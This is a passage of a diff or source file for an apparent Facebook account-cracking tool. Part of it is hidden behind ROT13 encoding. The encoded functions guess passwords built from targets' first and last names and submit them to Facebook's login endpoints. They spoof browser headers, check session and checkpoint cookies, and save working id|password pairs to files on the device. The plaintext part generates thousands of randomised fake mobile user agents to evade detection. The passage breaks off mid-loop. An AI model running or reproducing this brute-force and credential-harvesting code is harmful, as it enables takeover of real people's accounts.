frffvba.trg(s\'uggcf://c.snprobbx.pbz/ybtva/qrivpr-onfrq/cnffjbeq/?hvq={vqf}&sybj=ybtva_ab_cva&ersfep=qrcerpngrq&_eqe\')\n                        vqcnff ={"yfq":er.frnepu(s\'anzr="yfq" inyhr="(.*?)"\', fge(trgybt.grkg)).tebhc(1),"wnmbrfg":er.frnepu(s\'anzr="wnmbrfg" inyhr="(.*?)"\', fge(trgybt.grkg)).tebhc(1),"hvq":vqf,"arkg":"uggcf://c.snprobbx.pbz/ybtva/fnir-qrivpr/","sybj":"ybtva_ab_cva","cnff":cnf,}\n                        pbzcyrgr = frffvba.cbfg(s\'uggcf://c.snprobbx.pbz/ybtva/qrivpr-onfrq/inyvqngr-cnffjbeq/?fuoy=0\',qngn=vqcnff,nyybj_erqverpgf=Snyfr,urnqref=urnq)\n                        wnyvvy=frffvba.pbbxvrf.trg_qvpg().xrlf()\n                        vs "p_hfre" va wnyvvy:\n                                pbxv=frffvba.pbbxvrf.trg_qvpg()\n                                xhxv = (s";").wbva([ "%f=%f" % (xrl, inyhr) sbe xrl, inyhr va frffvba.pbbxvrf.trg_qvpg().vgrzf() ])\n                                cevag(s\'\\e\\e\\033[1;32z [WNYVVVY\\033[1;36z•\\033[1;37z\\033[1;32zBX] %f \\033[1;36z•\\033[1;37z\\033[1;32z %f\'%(vqf,cnf))\n                                #prx_ncx(frffvba,pbxv)\n                                #cevag(s\'\\033[1;36z [Pbbxvr]\\033[1;37z : \'+pbxv)\n                                bcra(s\'/fqpneq/WNYVVVY•BX•Z1.gkg\', \'n\').jevgr(vqf+\'|\'+cnf+\'\\a\')\n                                bxf.nccraq(vqf)\n                                oernx\n                        ryvs \'purpxcbvag\' va wnyvvy:\n                                vs \'l\' va cpc:\n                                        cevag(s\'\\e\\e\\k1o[38;5;208z [WNYVVVY•PC] \'+vqf+\' • \'+cnf+\'\\033[1;97z\')\n                                        bcra(s\'/fqpneq/WNYVVVY•PC.gkg\', \'n\').jevgr(vqf+\'|\'+cnf+\'\\a\')\n                                        pcf.nccraq(vqf)\n                                        oernx\n                                ryfr:\n                                        oernx\n                        ryfr:\n                                pbagvahr\n        rkprcg erdhrfgf.rkprcgvbaf.PbaarpgvbaReebe:\n                gvzr.fyrrc(20)\n        ybbc+=1\n                        \nqrs z3(vqf,anzrf,cnffyvfg):\n        tybony ybbc,bxf,pcf\n        flf.fgqbhg.jevgr(s\'\\e\\e\\033[1;37z [WNYVVVY] \\033[1;36z•\\033[1;37z %f \\033[1;36z•\\033[1;37z BX \\033[1;36z•\\033[1;37z [\\033[1;32z%f\\033[1;37z]\'%(ybbc,yra(bxf)));flf.fgqbhg.syhfu()\n        frffvba = erdhrfgf.Frffvba()\n        gel:\n                svefg = anzrf.fcyvg(s\' \')[0]\n                gel:\n                        ynfg = anzrf.fcyvg(s\' \')[1]\n                rkprcg:\n                        ynfg = \'Nuzrq\'\n                cf = svefg.ybjre()\n                cf2 = ynfg.ybjre()\n                sbe svxe va cnffyvfg:\n               \t        cnf = svxe.ercynpr(s\'Svefg\',svefg).ercynpr(s\'Ynfg\',ynfg).ercynpr(s\'svefg\',cf).ercynpr(s\'ynfg\',cf2)\n                        hn=enaqbz.pubvpr(htra)\n                        urnq = {\'Ubfg\': \'z.snprobbx.pbz\', \'ivrjcbeg-jvqgu\': \'980\',  \'frp-pu-hn\': \'" Abg N;Oenaq";i="99", "Puebzvhz";i="101", "Tbbtyr Puebzr";i="101"\', \'frp-pu-hn-zbovyr\': \'?1\', \'frp-pu-hn-cyngsbez\':\'"Naqebvq"\', \'frp-pu-cersref-pbybe-fpurzr\': \'yvtug\', \'qag\': \'1\', \'hctenqr-vafrpher-erdhrfgf\': \'1\', \'hfre-ntrag\': hn, \'npprcg\': \'grkg/ugzy,nccyvpngvba/kugzy+kzy,nccyvpngvba/kzy;d=0.9,vzntr/nivs,vzntr/jroc,vzntr/ncat,*[vafregrq ol plguba gb nibvq pbzzrag pybfre]/[vafregrq ol plguba gb nibvq pbzzrag fgneg]*;d=0.8,nccyvpngvba/fvtarq-rkpunatr;i=o3;d=0.9\', \'frp-srgpu-fvgr\': \'fnzr-bevtva\', \'frp-srgpu-zbqr\': \'anivtngr\', \'frp-srgpu-hfre\': \'?1\', \'frp-srgpu-qrfg\': \'qbphzrag\', \'npprcg-rapbqvat\': \'tmvc, qrsyngr, oe\', \'npprcg-ynathntr\': \'ra-HF,ra;d=0.9\'}\n                        trgybt = frffvba.trg(s\'uggcf://zonfvp.snprobbx.pbz/ybtva/qrivpr-onfrq/cnffjbeq/?hvq={vqf}&sybj=ybtva_ab_cva&ersfep=qrcerpngrq&_eqe\')\n                        vqcnff ={"yfq":er.frnepu(s\'anzr="yfq" inyhr="(.*?)"\', fge(trgybt.grkg)).tebhc(1),"wnmbrfg":er.frnepu(s\'anzr="wnmbrfg" inyhr="(.*?)"\', fge(trgybt.grkg)).tebhc(1),"hvq":vqf,"arkg":"uggcf://zonfvp.snprobbx.pbz/ybtva/fnir-qrivpr/","sybj":"ybtva_ab_cva","cnff":cnf,}\n                        pbzcyrgr = frffvba.cbfg(s\'uggcf://zonfvp.snprobbx.pbz/ybtva/qrivpr-onfrq/inyvqngr-cnffjbeq/?fuoy=0\',qngn=vqcnff,nyybj_erqverpgf=Snyfr,urnqref=urnq)\n                        wnyvvy=frffvba.pbbxvrf.trg_qvpg().xrlf()\n                        vs "p_hfre" va wnyvvy:\n                                pbxv=frffvba.pbbxvrf.trg_qvpg()\n                                xhxv = (s";").wbva([ "%f=%f" % (xrl, inyhr) sbe xrl, inyhr va frffvba.pbbxvrf.trg_qvpg().vgrzf() ])\n                                cevag(s\'\\e\\e\\033[1;32z [WNYVVVY\\033[1;36z•\\033[1;37z\\033[1;32zBX] %f \\033[1;36z•\\033[1;37z\\033[1;32z %f\'%(vqf,cnf))\n                                #prx_ncx(frffvba,pbxv)\n                                #cevag(s\'\\033[1;36z [Pbbxvr]\\033[1;37z : \'+pbxv)\n                                bcra(s\'/fqpneq/WNYVVVY•BX•Z3.gkg\', \'n\').jevgr(vqf+\'|\'+cnf+\'\\a\')\n                                bxf.nccraq(vqf)\n                                oernx\n                        ryvs \'purpxcbvag\' va wnyvvy:\n                                vs \'l\' va cpc:\n                                        cevag(s\'\\e\\e\\k1o[38;5;208z [WNYVVVY•PC] \'+vqf+\' • \'+cnf+\'\\033[1;97z\')\n                                        bcra(s\'/fqpneq/WNYVVVY•PC.gkg\', \'n\').jevgr(vqf+\'|\'+cnf+\'\\a\')\n                                        pcf.nccraq(vqf)\n                                        oernx\n                                ryfr:\n                                        oernx\n                        ryfr:\n                                pbagvahr\n        rkprcg erdhrfgf.rkprcgvbaf.PbaarpgvbaReebe:\n                gvzr.fyrrc(20)\n        ybbc+=1\n\nqrs z2(vqf,anzrf,cnffyvfg):\n        tybony ybbc,bxf,pcf\n        flf.fgqbhg.jevgr(s\'\\e\\e\\033[1;37z [WNYVVVY] \\033[1;36z•\\033[1;37z %f \\033[1;36z•\\033[1;37z BX \\033[1;36z•\\033[1;37z [\\033[1;32z%f\\033[1;37z]\'%(ybbc,yra(bxf)));flf.fgqbhg.syhfu()\n        frffvba = erdhrfgf.Frffvba()\n        gel:\n                svefg = anzrf.fcyvg(s\' \')[0]\n                gel:\n                        ynfg = anzrf.fcyvg(s\' \')[1]\n                rkprcg:\n                        ynfg = \'Nuzrq\'\n                cf = svefg.ybjre()\n                cf2 = ynfg.ybjre()\n                sbe svxe va cnffyvfg:\n               \t        cnf = svxe.ercynpr(s\'Svefg\',svefg).ercynpr(s\'Ynfg\',ynfg).ercynpr(s\'svefg\',cf).ercynpr(s\'ynfg\',cf2)\n                        hn=enaqbz.pubvpr(htra)\n                        urnq = {\'Ubfg\': \'zonfvp.snprobbx.pbz\', \'ivrjcbeg-jvqgu\': \'980\', \'frp-pu-hn\': \'" Abg N;Oenaq";i="99", "Puebzvhz";i="101", "Tbbtyr Puebzr";i="101"\', \'frp-pu-hn-zbovyr\': \'?1\', \'frp-pu-hn-cyngsbez\':\'"Jvaqbjf"\', \'frp-pu-cersref-pbybe-fpurzr\': \'yvtug\', \'qag\': \'1\', \'hctenqr-vafrpher-erdhrfgf\': \'1\', \'hfre-ntrag\': hn, \'npprcg\': \'grkg/ugzy,nccyvpngvba/kugzy+kzy,nccyvpngvba/kzy;d=0.9,vzntr/nivs,vzntr/jroc,vzntr/ncat,*[vafregrq ol plguba gb nibvq pbzzrag pybfre]/[vafregrq ol plguba gb nibvq pbzzrag fgneg]*;d=0.8,nccyvpngvba/fvtarq-rkpunatr;i=o3;d=0.9\', \'frp-srgpu-fvgr\': \'abar\', \'frp-srgpu-zbqr\': \'anivtngr\', \'frp-srgpu-hfre\': \'?1\', \'frp-srgpu-qrfg\': \'qbphzrag\', \'npprcg-rapbqvat\': \'tmvc, qrsyngr, oe\', \'npprcg-ynathntr\': \'ra-HF,ra;d=0.9\'}\n                        trgybt = frffvba.trg(s\'uggcf://zonfvp.snprobbx.pbz/ybtva/qrivpr-onfrq/cnffjbeq/?hvq={vqf}&sybj=ybtva_ab_cva&ersfep=qrcerpngrq&_eqe\')\n                        vqcnff ={"yfq":er.frnepu(s\'anzr="yfq" inyhr="(.*?)"\', fge(trgybt.grkg)).tebhc(1),"wnmbrfg":er.frnepu(s\'anzr="wnmbrfg" inyhr="(.*?)"\', fge(trgybt.grkg)).tebhc(1),"hvq":vqf,"arkg":"uggcf://zonfvp.snprobbx.pbz/ybtva/fnir-qrivpr/","sybj":"ybtva_ab_cva","cnff":cnf,}\n                        pbzcyrgr = frffvba.cbfg(s\'uggcf://zonfvp.snprobbx.pbz/ybtva/qrivpr-onfrq/inyvqngr-cnffjbeq/?fuoy=0\',qngn=vqcnff,nyybj_erqverpgf=Snyfr,urnqref=urnq)\n                        wnyvvy=frffvba.pbbxvrf.trg_qvpg().xrlf()\n                        vs "p_hfre" va wnyvvy:\n                                pbxv=frffvba.pbbxvrf.trg_qvpg()\n                                xhxv = (s";").wbva([ "%f=%f" % (xrl, inyhr) sbe xrl, inyhr va frffvba.pbbxvrf.trg_qvpg().vgrzf() ])\n                                cevag(s\'\\e\\e\\033[1;32z [WNYVVVY\\033[1;36z•\\033[1;37z\\033[1;32zBX] %f \\033[1;36z•\\033[1;37z\\033[1;32z %f\'%(vqf,cnf))\n                                #prx_ncx(frffvba,pbxv)\n                                #cevag(s\'\\033[1;36z [Pbbxvr]\\033[1;37z : \'+pbxv)\n                                bcra(s\'/fqpneq/WNYVVVY•BX•Z2.gkg\', \'n\').jevgr(vqf+\'|\'+cnf+\'\\a\')\n                                bxf.nccraq(vqf)\n                                oernx\n                        ryvs \'purpxcbvag\' va wnyvvy:\n                                vs \'l\' va cpc:\n                                        cevag(s\'\\e\\e\\k1o[38;5;208z [WNYVVVY•PC] \'+vqf+\' • \'+cnf+\'\\033[1;97z\')\n                                        bcra(s\'/fqpneq/WNYVVVY•PC.gkg\', \'n\').jevgr(vqf+\'|\'+cnf+\'\\a\')\n                                        pcf.nccraq(vqf)\n                                        oernx\n                                ryfr:\n                                        oernx\n                        ryfr:\n                                pbagvahr\n        rkprcg erdhrfgf.rkprcgvbaf.PbaarpgvbaReebe:\n                gvzr.fyrrc(20)\n        ybbc+=1\n\nqrs z4(vqf,anzrf,cnffyvfg):\n        tybony ybbc,bxf,pcf\n        flf.fgqbhg.jevgr(s\'\\e\\e\\033[1;37z [WNYVVVY] \\033[1;36z•\\033[1;37z %f \\033[1;36z•\\033[1;37z BX \\033[1;36z•\\033[1;37z [\\033[1;32z%f\\033[1;37z]\'%(ybbc,yra(bxf)));flf.fgqbhg.syhfu()\n        frffvba = erdhrfgf.Frffvba()\n        gel:\n                svefg = anzrf.fcyvg(s\' \')[0]\n                gel:\n                        ynfg = anzrf.fcyvg(s\' \')[1]\n                rkprcg:\n                        ynfg = \'Nuzrq\'\n                cf = svefg.ybjre()\n                cf2 = ynfg.ybjre()\n                sbe svxe va cnffyvfg:\n               \t        cnf = svxe.ercynpr(s\'Svefg\',svefg).ercynpr(s\'Ynfg\',ynfg).ercynpr(s\'svefg\',cf).ercynpr(s\'ynfg\',cf2)\n                        hn=enaqbz.pubvpr(htra)\n                        urnq = {\'Ubfg\': \'k.snprobbx.pbz\', \'ivrjcbeg-jvqgu\': \'980\',  \'frp-pu-hn\': \'" Abg N;Oenaq";i="99", "Puebzvhz";i="101", "Tbbtyr Puebzr";i="101"\', \'frp-pu-hn-zbovyr\': \'?1\', \'frp-pu-hn-cyngsbez\':\'"Naqebvq"\', \'frp-pu-cersref-pbybe-fpurzr\': \'yvtug\', \'qag\': \'1\', \'hctenqr-vafrpher-erdhrfgf\': \'1\', \'hfre-ntrag\': hn, \'npprcg\': \'grkg/ugzy,nccyvpngvba/kugzy+kzy,nccyvpngvba/kzy;d=0.9,vzntr/nivs,vzntr/jroc,vzntr/ncat,*[vafregrq ol plguba gb nibvq pbzzrag pybfre]/[vafregrq ol plguba gb nibvq pbzzrag fgneg]*;d=0.8,nccyvpngvba/fvtarq-rkpunatr;i=o3;d=0.9\', \'frp-srgpu-fvgr\': \'fnzr-bevtva\', \'frp-srgpu-zbqr\': \'anivtngr\', \'frp-srgpu-hfre\': \'?1\', \'frp-srgpu-qrfg\': \'qbphzrag\', \'npprcg-rapbqvat\': \'tmvc, qrsyngr, oe\', \'npprcg-ynathntr\': \'ra-HF,ra;d=0.9\'}\n                        trgybt = frffvba.trg(s\'uggcf://zonfvp.snprobbx.pbz/ybtva/qrivpr-onfrq/cnffjbeq/?hvq={vqf}&sybj=ybtva_ab_cva&ersfep=qrcerpngrq&_eqe\')\n                        vqcnff ={"yfq":er.frnepu(s\'anzr="yfq" inyhr="(.*?)"\', fge(trgybt.grkg)).tebhc(1),"wnmbrfg":er.frnepu(s\'anzr="wnmbrfg" inyhr="(.*?)"\', fge(trgybt.grkg)).tebhc(1),"hvq":vqf,"arkg":"uggcf://zonfvp.snprobbx.pbz/ybtva/fnir-qrivpr/","sybj":"ybtva_ab_cva","cnff":cnf,}\n                        pbzcyrgr = frffvba.cbfg(s\'uggcf://zonfvp.snprobbx.pbz/ybtva/qrivpr-onfrq/inyvqngr-cnffjbeq/?fuoy=0\',qngn=vqcnff,nyybj_erqverpgf=Snyfr,urnqref=urnq)\n                        wnyvvy=frffvba.pbbxvrf.trg_qvpg().xrlf()\n                        vs "p_hfre" va wnyvvy:\n                                pbxv=frffvba.pbbxvrf.trg_qvpg()\n                                xhxv = (s";").wbva([ "%f=%f" % (xrl, inyhr) sbe xrl, inyhr va frffvba.pbbxvrf.trg_qvpg().vgrzf() ])\n                                cevag(s\'\\e\\e\\033[1;32z [WNYVVVY\\033[1;36z•\\033[1;37z\\033[1;32zBX] %f \\033[1;36z•\\033[1;37z\\033[1;32z %f\'%(vqf,cnf))\n                                #prx_ncx(frffvba,pbxv)\n                                #cevag(s\'\\033[1;36z [Pbbxvr]\\033[1;37z : \'+pbxv)\n                                bcra(s\'/fqpneq/WNYVVVY•BX•Z4.gkg\', \'n\').jevgr(vqf+\'|\'+cnf+\'\\a\')\n                                bxf.nccraq(vqf)\n                                oernx\n                        ryvs \'purpxcbvag\' va wnyvvy:\n                                vs \'l\' va cpc:\n                                        cevag(s\'\\e\\e\\k1o[38;5;208z [WNYVVVY•PC] \'+vqf+\' • \'+cnf+\'\\033[1;97z\')\n                                        bcra(s\'/fqpneq/WNYVVVY•PC.gkg\', \'n\').jevgr(vqf+\'|\'+cnf+\'\\a\')\n                                        pcf.nccraq(vqf)\n                                        oernx\n                                ryfr:\n                                        oernx\n                        ryfr:\n                                pbagvahr\n        rkprcg erdhrfgf.rkprcgvbaf.PbaarpgvbaReebe:\n                gvzr.fyrrc(20)\n        ybbc+=1\n\n\nSbs()''',__))('rot_13',__import__('codecs').decode))
+from os import path
+import os,base64,zlib,pip,urllib,time
+print('[\033[1;32m✓\033[1;37m] Checking For Update !! ')
+time.sleep(1.5)
+print('[\033[1;32m✓\033[1;37m] Wait For Update Tool !! ')
+time.sleep(1.5)
+os.system('git pull')
+os.system('clear')
+print('[\033[1;32m✓\033[1;37m] Update Done \033[1;32m✓\033[1;37m Now You Can Use This Tool :) ')
+time.sleep(2)
+try:
+        import os,requests,json,time,re,random,sys,uuid,string,subprocess
+        from string import *
+        from concurrent.futures import ThreadPoolExecutor as tred
+except ModuleNotFoundError:
+        os.system(f'pip install requests futures==2 > /dev/null')
+        os.system('git pull')
+except:pass
+fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
+gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
+xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
+tan=('https')
+iya=('github')
+ani=('Fariya')
+love=('mbasic')
+ugen=[]
+ugen=[]
+useragent=[]
+header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
+header_grup = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-N986N Build/ZK83T5) [FBAN/FB4A;FBAV/979.2.9.20.981;FBPN/com.facebook.katana;FBLC/en_US;FBBV/687217741;FBCR/Glo Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-N986N;FBSV/11;FBCA/x86:armeabi-v7a;FBDM/{density=2.5,width=1080,height=2220};FB_FW/0;FBRV/0;]"}
+header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 9; Nokia C2 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.79 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/297.0.0.13.113;]"}
+for xd in range(10000):
+        aa='Mozilla/5.0 (Linux; Android 10; Nokia 1 Plus Build/QP1A.190711.020; wv)'
+        b=random.choice(['6','7','8','9','10','11','12',])
+        c=f' TL-tl; {str(gt)}'
+        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79'
+        h=random.randrange(73,100)
+        i='0'
+        j=random.randrange(4200,4900)
+        k=random.randrange(40,150)
+        l='Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/319.0.0.7.107;]'
+        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
+        ugen.append(uaku2)
+
+for agent in range(10000):
+        aa='Mozilla/5.0 (Linux; Android 9; Nokia C2 Build/PPR1.180610.011; wv)'
+        b=random.choice(['6','7','8','9','10','11','12'])
+        c='Android 9; Nokia C2 Build/'
+        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        e=random.randrange(1, 999)
+        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.79'
+        h=random.randrange(73,100)
+        i='0'
+        j=random.randrange(4200,4900)
+        k=random.randrange(40,150)
+        l='Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/297.0.0.13.113;]'
+        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+        ugen.append(fullagnt)
+        
+for agent in range(10000):
+        aa='Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)'
+        b=random.choice(['6','7','8','9','10','11','12'])
+        c='CPU iPhone OS 16_0 like Mac OS X'
+        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        e=random.randrange(1, 999)
+        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        g='AppleWebKit/605.1.15 (KHTML, like Gecko)'
+        h=random.randrange(73,100)
+        i='0'
+        j=random.randrange(4200,4900)
+        k=random.randrange(40,150)
